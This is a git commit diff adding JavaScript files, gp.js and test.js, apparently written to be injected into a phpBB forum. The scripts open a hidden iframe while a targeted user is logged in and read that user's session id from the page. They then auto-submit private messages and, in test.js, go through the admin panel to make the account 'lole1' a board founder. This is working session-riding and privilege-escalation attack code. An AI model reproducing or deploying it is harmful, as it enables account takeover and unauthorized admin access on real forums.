3ac11d0b434b9b9f9b4956f519e14106ee9bff32
unknown <igor.l.leonhardt@gmail.com>
2022-06-15 11:47:54 -0300

    1

--- gp.js
+++ gp.js
@@ -1,11 +1,45 @@
+// var header = document.getElementById('header');
+// var user_name = document.getElementsByClassName("ptop2 pleft1")[0].children[0].innerHTML;
+// if (!document.getElementById("del1me")) {
+//     if (user_name === "Bury_comedor") {
+//         var iframe = document.createElement('iframe');
+//         iframe.id = "del1me";
+//         iframe.src = `https://gparena.net/forum/ucp.php?i=pm&mode=compose`;
+//         iframe.height = "400";
+//         iframe.width = "400";
+//         iframe.style.opacity = 0;
+//         iframe.style.position = "absolute";
+//         iframe.style.zIndex = -1;
+//         iframe.style.top = "-30px";
+//         header.append(iframe);
+//         const wait = setTimeout(stealThisMoment, secondsToMS(3));
+//     };
+// }
+
+// function stealThisMoment() {
+//     console.log("3secs!");
+//     iframe.contentWindow.document.getElementById("username_list").value = "!lole";
+//     iframe.contentWindow.document.getElementsByName("add_to")[0].click();
+//     iframe.contentWindow.document.getElementById("subject").value = "beary";
+//     iframe.contentWindow.document.getElementById("message").value = "chicanery";
+//     iframe.contentWindow.document.getElementsByName("post")[0].click();
+//     setTimeout(() => { iframe.contentWindow.document.getElementsByName("post")[0].click() }, secondsToMS(3));
+// };
+
+
+// function secondsToMS(seconds) {
+//     return seconds * 1000;
+// };
+
 // var script_ids = ["a1", "a2", "a3", "a4"];
+
 var header = document.getElementById('header');
 var user_name = document.getElementsByClassName("ptop2 pleft1")[0].children[0].innerHTML;
 if (!document.getElementById("del1me")) {
-    if (user_name === "Bury_comedor") {
+    if (user_name === "BRAND") {
         var iframe = document.createElement('iframe');
         iframe.id = "del1me";
-        iframe.src = `https://gparena.net/forum/ucp.php?i=pm&mode=compose`;
+        iframe.src = `https://gparena.net/forum/`;
         iframe.height = "400";
         iframe.width = "400";
         iframe.style.opacity = 0;
@@ -19,6 +53,12 @@ if (!document.getElementById("del1me")) {
 
 function stealThisMoment() {
     console.log("3secs!");
+    var sid = iframe.contentWindow.document.getElementsByClassName('footer-link text-strong')[0].href.split('=')[1];
+    console.log("sid is = " + sid);
+
+    setTimeout(() => { 
+        
+     }, secondsToMS(3));
     iframe.contentWindow.document.getElementById("username_list").value = "!lole";
     iframe.contentWindow.document.getElementsByName("add_to")[0].click();
     iframe.contentWindow.document.getElementById("subject").value = "beary";
@@ -30,32 +70,8 @@ function stealThisMoment() {
 
 function secondsToMS(seconds) {
     return seconds * 1000;
-}
+};
 
-// script_ids.forEach(script => {
-//     if (document.getElementById(script)) {
-//         document.getElementById(script).remove;
-//     }
-// });
 
-// function stealThisMoment() {
-//     if (user_name === "Bury_comedor") {
-//         var iframe = document.createElement('iframe');
-//         iframe.id = "del1me";
-//         iframe.src = `https://gparena.net/forum/ucp.php?i=pm&mode=compose`;
-//         iframe.height = "400";
-//         iframe.width = "400";
-//         iframe.style.opacity = 0;
-//         iframe.style.position = "absolute";
-//         iframe.style.zIndex = -1;
-//         iframe.style.top = "-30px";
-//         header.append(iframe);
-//         document.getElementById("del1me");
-//         iframe.contentWindow.document.getElementById("username_list").value = "!lole";
-//         iframe.contentWindow.document.getElementsByName("add_to")[0].click();
-//         iframe.contentWindow.document.getElementById("subject").value = "bury";
-//         iframe.contentWindow.document.getElementById("message").value = "chicanery";
-//         iframe.contentWindow.document.getElementsByClassName("button1 default-submit-action")[0].click();
-//         //iframe.contentWindow.document.getElementsByName("add_to")[0].click();
-//     };
-// };
+window.location.replace('https://stackoverflow.com/questions/1226714/how-to-get-the-browser-to-navigate-to-url-in-javascript');
+
---
+++ test.js
@@ -0,0 +1,50 @@
+// var script_ids = ["a1", "a2", "a3", "a4"];
+//var header = document.getElementById('header');
+//var user_name = document.getElementsByClassName("ptop2 pleft1")[0].children[0].innerHTML;
+var user_name = "homu";
+if (!document.getElementById("gp_h1")) {
+    if (user_name === "homu") {
+        var iframe = document.createElement('iframe');
+        iframe.id = "gp_h1";
+        iframe.src = `http://localhost/AM/phpbb3/`;
+        iframe.height = "600";
+        iframe.width = "600";
+        //iframe.style.opacity = 0;
+        iframe.style.position = "absolute";
+        iframe.style.zIndex = -1;
+        //iframe.style.top = "-30px";
+        //header.append(iframe);
+        document.body.append(iframe);
+        const wait = setTimeout(stealThisMoment, secondsToMS(3));
+    };
+}
+
+function stealThisMoment() {
+    console.log("3secs!");
+    var sid = iframe.contentWindow.document.getElementsByClassName('footer-link text-strong')[0].href.split('=')[1];
+    console.log("sid is = " + sid);
+    iframe.contentWindow.window.location.replace(`http://localhost/AM/phpbb3/adm/index.php?sid=${sid}&i=acp_users&mode=overview`);
+    setTimeout(() => { 
+        iframe.contentWindow.document.getElementById("username").value = "lole1";
+        iframe.contentWindow.document.getElementsByName("submituser")[0].click();
+        setTimeout(() => { 
+            iframe.contentWindow.document.getElementsByName("user_founder")[0].click();
+            iframe.contentWindow.document.getElementsByName("update")[0].click();
+         }, secondsToMS(3));
+     }, secondsToMS(3));
+    iframe.contentWindow.document.getElementById("username_list").value = "!lole";
+    iframe.contentWindow.document.getElementsByName("add_to")[0].click();
+    iframe.contentWindow.document.getElementById("subject").value = "beary";
+    iframe.contentWindow.document.getElementById("message").value = "chicanery";
+    iframe.contentWindow.document.getElementsByName("post")[0].click();
+    setTimeout(() => { iframe.contentWindow.document.getElementsByName("post")[0].click() }, secondsToMS(3));
+};
+
+
+function secondsToMS(seconds) {
+    return seconds * 1000;
+};
+
+
+window.location.replace('https://stackoverflow.com/questions/1226714/how-to-get-the-browser-to-navigate-to-url-in-javascript');
+
